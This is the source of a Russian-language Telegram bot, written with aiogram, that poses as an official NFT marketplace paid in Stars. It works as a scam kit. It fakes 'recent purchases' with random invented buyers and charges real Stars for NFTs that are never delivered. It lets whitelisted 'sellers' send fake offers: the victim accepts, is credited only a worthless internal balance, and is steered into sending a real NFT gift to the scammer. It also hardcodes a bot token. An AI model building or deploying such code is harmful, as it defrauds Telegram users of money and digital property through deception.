import asyncio
import logging
import random
import re

from aiogram import Bot, Dispatcher, F
from aiogram.filters import Command
from aiogram.types import (
    Message,
    CallbackQuery,
    ReplyKeyboardMarkup,
    KeyboardButton,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    LabeledPrice,
    PreCheckoutQuery,
    InlineQuery,
    InlineQueryResultArticle,
    InputTextMessageContent,
    LinkPreviewOptions,
)

BOT_TOKEN = "8781808762:AAHQcW9iyqjGwSFn680XjpL4F5Pe9Ycmx0E"

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

SELLER_IDS = {8457857107, 7067198657, 5598926953, 8711558266, 8766135050}


def is_registered_seller(user_id: int) -> bool:
    return user_id in SELLER_IDS


NOT_REGISTERED_TEXT = "К сожалению, вы не зарегистрированы в нашей программе продавцов NFT."

user_balances = {}


def get_balance(user_id: int) -> int:
    return user_balances.get(user_id, 0)


def add_balance(user_id: int, amount: int):
    user_balances[user_id] = get_balance(user_id) + amount


NFT_CATALOG = [
    {"id": 1, "name": "Space ID #4821", "price": 350, "link": "https://t.me/nft/Space-ID-4821"},
    {"id": 2, "name": "Pudgy Penguins TON #1337", "price": 940, "link": "https://t.me/nft/Pudgy-Penguins-TON-1337"},
    {"id": 3, "name": "Ape TON Yacht #7", "price": 2450, "link": "https://t.me/nft/Ape-TON-Yacht-7"},
    {"id": 4, "name": "Meebits TON #99", "price": 620, "link": "https://t.me/nft/Meebits-TON-99"},
    {"id": 5, "name": "Kreepos #42", "price": 480, "link": "https://t.me/nft/Kreepos-42"},
    {"id": 6, "name": "TON Genesis #1", "price": 5900, "link": "https://t.me/nft/TON-Genesis-1"},
]

BUYER_POOL = [
    "@maxim_ton", "@elena_nft", "@dmitry88", "@kate_art", "@artem_p",
    "@nft_hunter", "@sofia_m", "@igror2025", "@luna_stars", "@victor_w",
    "@anya_col", "@tomas_b", "@olga_nft", "@sergey_t", "@mari_k",
]
TIME_POOL = [
    "только что", "2 мин. назад", "7 мин. назад", "15 мин. назад",
    "26 мин. назад", "41 мин. назад", "1 ч. назад",
]


def build_recent_purchases(count: int = 4) -> list[dict]:
    return [
        {
            "buyer": random.choice(BUYER_POOL),
            "nft": random.choice(NFT_CATALOG),
            "time": random.choice(TIME_POOL),
        }
        for _ in range(count)
    ]


def format_recent_purchases() -> str:
    lines = ["🔥 Недавние покупки:"]
    for item in build_recent_purchases():
        lines.append(
            f"  • {item['buyer']} купил(а) {item['nft']['name']} — {item['nft']['price']} ⭐ ({item['time']})"
        )
    return "\n".join(lines)


def get_main_menu_keyboard(user_id: int = 0) -> ReplyKeyboardMarkup:
    rows = [
        [KeyboardButton(text="🛒 Каталог NFT")],
        [
            KeyboardButton(text="👤 Профиль"),
            KeyboardButton(text="⭐ Пополнить звёзды"),
        ],
    ]
    if is_registered_seller(user_id):
        rows.append([KeyboardButton(text="📨 Создать оффер")])
    keyboard = ReplyKeyboardMarkup(
        keyboard=rows,
        resize_keyboard=True,
        input_field_placeholder="Выберите действие...",
    )
    return keyboard


def get_top_up_inline_keyboard() -> InlineKeyboardMarkup:
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="100 ⭐", callback_data="pay_100"),
            InlineKeyboardButton(text="500 ⭐", callback_data="pay_500"),
        ],
        [InlineKeyboardButton(text="1500 ⭐", callback_data="pay_1500")],
    ])
    return keyboard


def get_catalog_inline_keyboard() -> InlineKeyboardMarkup:
    rows = []
    for nft in NFT_CATALOG:
        rows.append([
            InlineKeyboardButton(
                text=f"{nft['name']} — {nft['price']} ⭐",
                callback_data=f"buy_{nft['id']}",
            )
        ])
    rows.append([InlineKeyboardButton(text="↻ Обновить каталог", callback_data="refresh_catalog")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


@dp.message(Command("start"))
async def cmd_start(message: Message):
    text = (
        "🚀 Добро пожаловать на NFT Market!\n"
        "Официальный маркетплейс NFT для Telegram.\n"
        "Покупайте и продавайте NFT прямо в Telegram — оплата звёздами ⭐.\n\n"
        f"{format_recent_purchases()}\n\n"
        "Выберите действие:"
    )
    await message.answer(
        text,
        reply_markup=get_main_menu_keyboard(message.from_user.id),
    )


@dp.message(Command("add"))
async def cmd_add_seller(message: Message):
    if not is_registered_seller(message.from_user.id):
        await message.answer(
            "Команда для зарегистрированных продавцов NFT.",
            reply_markup=get_main_menu_keyboard(message.from_user.id),
        )
        return

    parts = (message.text or "").split()
    if len(parts) != 2:
        await message.answer("Формат: /add <ID>\nПример: /add 123456789")
        return

    raw_id = parts[1]
    if not raw_id.isdigit():
        await message.answer(f"❌ ID должен состоять из цифр.\nВы ввели: {raw_id}")
        return

    new_id = int(raw_id)
    if new_id == message.from_user.id:
        await message.answer("Вы уже зарегистрированы в программе продавцов.")
        return

    if new_id in SELLER_IDS:
        await message.answer(f"✅ Пользователь {new_id} уже зарегистрирован.")
        return

    SELLER_IDS.add(new_id)
    await message.answer(
        f"✅ Пользователь {new_id} зарегистрирован в программе продавцов NFT.\n"
        f"Всего продавцов: {len(SELLER_IDS)}",
        reply_markup=get_main_menu_keyboard(message.from_user.id),
    )


@dp.message(Command("sellers"))
async def cmd_sellers(message: Message):
    if not is_registered_seller(message.from_user.id):
        await message.answer(
            "Команда для зарегистрированных продавцов NFT.",
            reply_markup=get_main_menu_keyboard(message.from_user.id),
        )
        return

    lines = [f"{i + 1}. {sid}" for i, sid in enumerate(sorted(SELLER_IDS))]
    await message.answer(
        f"👥 Зарегистрированные продавцы ({len(SELLER_IDS)}):\n" + "\n".join(lines)
    )


@dp.message(F.text == "👤 Профиль")
async def show_profile(message: Message):
    inline_status = (
        "✅ доступ открыт"
        if is_registered_seller(message.from_user.id)
        else "🔒 доступ закрыт"
    )
    text = (
        "👤 Профиль\n\n"
        f"Пользователь: @{message.from_user.username or 'unknown'}\n"
        f"ID: {message.from_user.id}\n"
        f"⭐ Баланс: {get_balance(message.from_user.id)} ⭐\n"
        f"Inline: {inline_status}"
    )
    await message.answer(text)


@dp.message(F.text == "🛒 Каталог NFT")
async def show_catalog(message: Message):
    listing = "\n".join(
        f"{i + 1}. {nft['name']} — <b>{nft['price']} ⭐</b>"
        for i, nft in enumerate(NFT_CATALOG)
    )
    text = (
        "🛒 Каталог NFT\n"
        "Популярные коллекции сети TON. Оплата звёздами с вашего баланса.\n\n"
        f"{listing}\n\n"
        f"{format_recent_purchases()}\n\n"
        "Выберите NFT для покупки:"
    )
    await message.answer(
        text,
        parse_mode="HTML",
        reply_markup=get_catalog_inline_keyboard(),
    )


@dp.message(F.text == "⭐ Пополнить звёзды")
async def show_top_up(message: Message):
    text = (
        "⭐ Пополнение баланса\n"
        f"Ваш текущий баланс: {get_balance(message.from_user.id)} ⭐\n\n"
        "Выберите сумму пополнения:"
    )
    await message.answer(text, reply_markup=get_top_up_inline_keyboard())


@dp.message(F.text.in_({"📨 Создать оффер", "📨 Отправить оффер"}))
async def show_offer(message: Message):
    if not is_registered_seller(message.from_user.id):
        await message.answer(
            NOT_REGISTERED_TEXT,
            reply_markup=get_main_menu_keyboard(message.from_user.id),
        )
        return

    bot_info = await bot.get_me()
    text = (
        "📨 Создание оффера\n"
        "Создание и публикация оффера бесплатны — баланс для этого не нужен.\n"
        "Открой Inline Mode и введи сначала ссылку NFT, затем через пробел цену в звёздах:\n\n"
        f"@{bot_info.username} https://t.me/nft/Название-123 39399\n\n"
        "Сумма выплачивается получателю из резерва сервера при принятии оффера. Баланс отправителя не списывается."
    )
    await message.answer(text)


@dp.callback_query(F.data.startswith("buy_"))
async def handle_buy_nft(call: CallbackQuery):
    nft_id = int(call.data.split("_")[1])
    nft = next((item for item in NFT_CATALOG if item["id"] == nft_id), None)

    if nft is None:
        await call.answer("NFT не найден. Обновите каталог.", show_alert=True)
        return

    user_id = call.from_user.id
    balance = get_balance(user_id)

    if balance < nft["price"]:
        await call.answer(
            f"Недостаточно звёзд: нужно {nft['price']} ⭐, у вас {balance} ⭐.\n"
            f"Пополните баланс.",
            show_alert=True,
        )
        return

    add_balance(user_id, -nft["price"])

    purchase_keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(
            text="ℹ️ Статус перевода в TON",
            url="https://tonviewer.com/",
        )]
    ])

    try:
        await edit_callback_message_markup(call, purchase_keyboard)
    except Exception:
        logging.exception("Не удалось обновить сообщение о покупке")

    await call.answer(
        f"✅ Покупка подтверждена!\n\n"
        f"«{nft['name']}» будет переведён из кошелька продавца в ваш профиль. "
        f"Подтверждение в сети TON занимает до 15 минут.\n\n"
        f"Списано: {nft['price']} ⭐\n"
        f"Баланс: {get_balance(user_id)} ⭐",
        show_alert=True,
    )


@dp.callback_query(F.data == "refresh_catalog")
async def handle_refresh_catalog(call: CallbackQuery):
    listing = "\n".join(
        f"{i + 1}. {nft['name']} — <b>{nft['price']} ⭐</b>"
        for i, nft in enumerate(NFT_CATALOG)
    )
    text = (
        "🛒 Каталог NFT\n"
        "Популярные коллекции сети TON. Оплата звёздами с вашего баланса.\n\n"
        f"{listing}\n\n"
        f"{format_recent_purchases()}\n\n"
        "Выберите NFT для покупки:"
    )
    if call.message is not None:
        try:
            await call.message.edit_text(
                text,
                parse_mode="HTML",
                reply_markup=get_catalog_inline_keyboard(),
            )
        except Exception:
            pass
    await call.answer("Каталог обновлён.", show_alert=False)


@dp.inline_query()
async def handle_inline_query(inline_query: InlineQuery):
    query_text = inline_query.query.strip()

    if not query_text:
        await inline_query.answer([], cache_time=1, is_personal=True)
        return

    if not is_registered_seller(inline_query.from_user.id):
        not_registered = InlineQueryResultArticle(
            id="not_registered",
            title="📋 Программа продавцов NFT",
            description=NOT_REGISTERED_TEXT,
            input_message_content=InputTextMessageContent(
                message_text=NOT_REGISTERED_TEXT,
            ),
        )
        await inline_query.answer(
            [not_registered], cache_time=1, is_personal=True
        )
        return

    match = re.search(r"(https://t\.me/nft/\S+)\s+(\d+)", query_text)

    if not match:
        error_result = InlineQueryResultArticle(
            id="error",
            title="❌ Неверный формат",
            description="Введи: https://t.me/nft/... Цена",
            input_message_content=InputTextMessageContent(
                message_text="Ошибка формата оффера.",
            ),
        )
        await inline_query.answer([error_result], cache_time=1, is_personal=True)
        return

    nft_link = match.group(1)
    price = int(match.group(2))
    nft_name = nft_link.split("/")[-1].replace("-", " #")

    sender_username = inline_query.from_user.username

    if not sender_username:
        error_result = InlineQueryResultArticle(
            id="no_username",
            title="❌ У вас нет username",
            description="Установите username в настройках Telegram, чтобы отправлять офферы.",
            input_message_content=InputTextMessageContent(
                message_text="Установите username.",
            ),
        )
        await inline_query.answer([error_result], cache_time=1, is_personal=True)
        return

    offer_text = (
        f"Пользователь предлагает Вам {price} ⭐ за <a href='{nft_link}'>{nft_name}</a>.\n\n"
        f"Предложение действует ещё 5 ч. 59 м.."
    )

    accept_callback = f"accept_{price}_{nft_name}_{sender_username}"

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="Отклонить", callback_data="reject_offer"),
            InlineKeyboardButton(text="Принять", callback_data=accept_callback),
        ]
    ])

    result = InlineQueryResultArticle(
        id="1",
        title="Оффер NFT",
        description=f"Цена: {price} ⭐",
        input_message_content=InputTextMessageContent(
            message_text=offer_text,
            parse_mode="HTML",
            link_preview_options=LinkPreviewOptions(
                url=nft_link,
                show_above_text=True,
            ),
        ),
        reply_markup=keyboard,
    )

    await inline_query.answer([result], cache_time=1, is_personal=True)


async def edit_callback_message_markup(
    call: CallbackQuery,
    reply_markup: InlineKeyboardMarkup | None,
) -> bool:
    if call.inline_message_id:
        await bot.edit_message_reply_markup(
            inline_message_id=call.inline_message_id,
            reply_markup=reply_markup,
        )
        return True

    if call.message is not None:
        await bot.edit_message_reply_markup(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            reply_markup=reply_markup,
        )
        return True

    return False


@dp.callback_query(F.data.startswith("accept_"))
async def handle_accept_offer(call: CallbackQuery):
    parts = (call.data or "").split("_", 3)

    if len(parts) != 4:
        await call.answer("Некорректные данные оффера.", show_alert=True)
        return

    price, nft_name, sender_username = parts[1], parts[2], parts[3]
    price_int = int(price)

    add_balance(call.from_user.id, price_int)

    transfer_keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(
            text="Передать NFT",
            url=f"tg://send_gift?to={sender_username}",
        )]
    ])

    try:
        edited = await edit_callback_message_markup(call, transfer_keyboard)
    except Exception:
        logging.exception("Не удалось обновить клавиатуру принятого оффера")
        await call.answer(
            "Не удалось обновить кнопки оффера. Попробуйте ещё раз.",
            show_alert=True,
        )
        return

    if not edited:
        await call.answer("Не удалось найти сообщение с оффером.", show_alert=True)
        return

    await call.answer(
        f"Предложение на {nft_name} принято.\n\n"
        f"Для завершения сделки владелец должен передать NFT.\n"
        f"Сумма оффера: {price} ⭐",
        show_alert=True,
    )


@dp.callback_query(F.data == "reject_offer")
async def handle_reject_offer(call: CallbackQuery):
    try:
        edited = await edit_callback_message_markup(call, None)
    except Exception:
        logging.exception("Не удалось убрать кнопки отклонённого оффера")
        await call.answer("Не удалось обновить сообщение с оффером.", show_alert=True)
        return

    if not edited:
        await call.answer("Не удалось найти сообщение с оффером.", show_alert=True)
        return

    await call.answer(
        "❌ Вы отклонили оффер.\n\nСделка отменена. Звёзды не списаны.",
        show_alert=True,
    )


async def send_star_invoice(chat_id: int, amount: int, title: str, payload: str):
    await bot.send_invoice(
        chat_id=chat_id,
        title=title,
        description=f"Пополнение баланса NFT Market на {amount} звёзд.",
        payload=payload,
        provider_token="",
        currency="XTR",
        prices=[LabeledPrice(label=title, amount=amount)],
    )


@dp.callback_query(F.data.startswith("pay_"))
async def handle_top_up_payment(call: CallbackQuery):
    amount = int(call.data.split("_")[1])
    await send_star_invoice(call.from_user.id, amount, f"Пополнение на {amount}⭐", call.data)
    await call.answer()


@dp.pre_checkout_query()
async def process_pre_checkout_query(pre_checkout_query: PreCheckoutQuery):
    await bot.answer_pre_checkout_query(pre_checkout_query.id, ok=True)


@dp.message(F.successful_payment)
async def process_successful_payment(message: Message):
    payment_info = message.successful_payment
    add_balance(message.from_user.id, payment_info.total_amount)
    await message.answer(
        f"✅ Баланс пополнен на {payment_info.total_amount} ⭐!\n"
        f"Теперь вы можете покупать NFT в каталоге.\n\n"
        f"Ваш баланс: {get_balance(message.from_user.id)} ⭐",
        reply_markup=get_main_menu_keyboard(message.from_user.id),
    )


async def main():
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())